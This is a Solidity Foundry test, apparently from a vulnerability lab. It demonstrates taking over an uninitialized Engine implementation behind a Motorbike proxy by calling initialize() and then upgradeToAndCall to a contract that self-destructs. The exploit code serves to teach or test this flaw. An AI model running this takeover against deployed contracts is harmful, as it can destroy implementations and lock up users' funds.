// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/Unitialized_variables.sol";

contract Exploit is Test {
    Engine EngineContract;
    Motorbike MotorbikeContract;
    Attack AttackContract;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function setUp() external {
        EngineContract = new Engine();
        MotorbikeContract = new Motorbike(address(EngineContract));
        AttackContract = new Attack();
    }

    function testUnitialized() public {
        // Engine contract is not initialized
        console.log("Unitialized upgrader: ", EngineContract.upgrader());
        // Malicious user calls initialize() on Engine contract to become upgrader.
        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
        // Malicious user becomes the upgrader
        console.log("Initialized upgrader: ", EngineContract.upgrader());

        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`
        bytes memory initEncoded = abi.encodeWithSignature("attack()");
        address(EngineContract).call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded)
        );
    }
}

contract Attack {
    function attack() external {
        selfdestruct(payable(msg.sender));
    }
}
